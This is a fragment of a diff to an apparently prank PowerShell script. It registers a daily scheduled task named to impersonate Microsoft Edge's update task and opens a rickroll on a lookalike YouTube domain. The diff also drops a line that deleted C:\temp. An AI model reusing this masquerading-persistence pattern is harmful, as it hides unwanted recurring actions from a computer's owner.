@@ -31,4 +31,3 @@ $trigger = New-ScheduledTaskTrigger -Daily -At 3pm
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MicrosoftEdgeUpdateTaskMachineCore{32533}" -Description "Ear death"
 Start-Process msedge https://www.yout-ube.com/watch?v=dQw4w9WgXcQ
 
-Remove-Item C:\temp -y
